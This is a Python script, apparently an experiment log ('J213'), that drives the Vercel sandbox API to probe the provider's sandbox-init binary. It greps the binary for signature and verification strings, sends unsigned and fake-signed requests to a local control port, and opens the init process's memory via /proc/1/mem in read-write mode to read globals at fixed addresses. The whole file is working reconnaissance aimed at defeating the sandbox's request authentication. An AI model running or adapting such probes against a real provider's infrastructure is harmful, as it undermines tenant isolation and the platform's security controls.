# 实验J213: 直接分析 sandbox-init 二进制(可读!)
# 1) strings 搜签名/密钥相关线索
# 2) 测试请求响应差异(无签名/假签名)
# 3) 请求后读全局变量状态(独立进程)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=30000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj213"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# 1) 二进制侦察: python实现strings搜索
bashfile(sid, "cp /run/vercel/share/sandbox-init /tmp/si && ls -la /tmp/si", "BIN_CP", 2000)
STRCODE = ("import re\n"
           "data = open('/tmp/si','rb').read()\n"
           "print('SIZE', len(data))\n"
           "words = re.findall(rb'[ -~]{6,}', data)\n"
           "kws = [b'signature', b'Signature', b'SIGNATURE', b'verify', b'Verify', b'ed25519', b'pubkey', b'X-Sig', b'x-signature']\n"
           "seen = set()\n"
           "for w in words:\n"
           "  if any(k in w for k in kws):\n"
           "    try: s = w.decode('utf-8', 'replace')\n"
           "    except: continue\n"
           "    if s not in seen:\n"
           "      seen.add(s)\n"
           "      print('S:', s[:200])\n")
run_cmd(sid, STRCODE, "BIN_STR", timeout=120)

# 2) 错误消息线索(invalid/bad + key)
ERRCODE = ("import re\n"
           "data = open('/tmp/si','rb').read()\n"
           "words = re.findall(rb'[ -~]{4,}', data)\n"
           "for w in words:\n"
           "  lw = w.lower()\n"
           "  if (b'invalid' in lw or b'bad' in lw or b'fail' in lw or b'error' in lw) and (b'key' in lw or b'sig' in lw or b'verif' in lw):\n"
           "    try: s = w.decode('utf-8', 'replace')\n"
           "    except: continue\n"
           "    print('E:', s[:200])\n")
run_cmd(sid, ERRCODE, "BIN_ERR", timeout=120)

# 3) 请求响应差异测试(独立进程, 不读内存)
REQCODE = ("import socket,time\n"
           "def h(p,m,path,hd,to=4):\n"
           "  s=socket.socket();s.settimeout(to)\n"
           "  try: s.connect(('127.0.0.1',p))\n"
           "  except Exception as e: return 'EXC:'+repr(e)\n"
           "  hdrs=f'{m} {path} HTTP/1.1\\r\\nHost: x\\r\\n'\n"
           "  for k,v in hd.items(): hdrs+=k+': '+v+'\\r\\n'\n"
           "  hdrs+='Content-Length: 2\\r\\n\\r\\n'\n"
           "  s.send(hdrs.encode()+b'{}');d=b''\n"
           "  try:\n"
           "    while len(d)<3000:\n"
           "      b2=s.recv(4096)\n"
           "      if not b2: break\n"
           "      d+=b2\n"
           "  except Exception: pass\n"
           "  s.close();return d\n"
           "now=str(int(time.time()))\n"
           "hdr={'Content-Type':'application/connect+json','Connect-Protocol-Version':'1','X-Timestamp':now}\n"
           "print('NO_SIG:',h(30001,'POST','/foo',hdr)[:200])\n"
           "hdr2=dict(hdr);hdr2['X-Signature']='AAAA'\n"
           "print('BAD_SIG:',h(30001,'POST','/foo',hdr2)[:200])\n")
run_cmd(sid, REQCODE, "REQ_TEST", timeout=120)

# 4) 请求后读全局变量状态(独立进程)
time.sleep(1)
GLOBCODE = ("import os,struct\n"
            "fd=os.open('/proc/1/mem',os.O_RDWR)\n"
            "def ra(a,n):\n"
            " os.lseek(fd,a,0);return os.read(fd,n)\n"
            "for addr in [0xe9e010,0xe9e610]:\n"
            " try:\n"
            "  h=ra(addr,24)\n"
            "  print(hex(addr),struct.unpack('<QQQ',h))\n"
            " except Exception as e: print(hex(addr),'ERR',repr(e))\n"
            "os.close(fd)\n")
run_cmd(sid, GLOBCODE, "GLOBALS", timeout=120)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
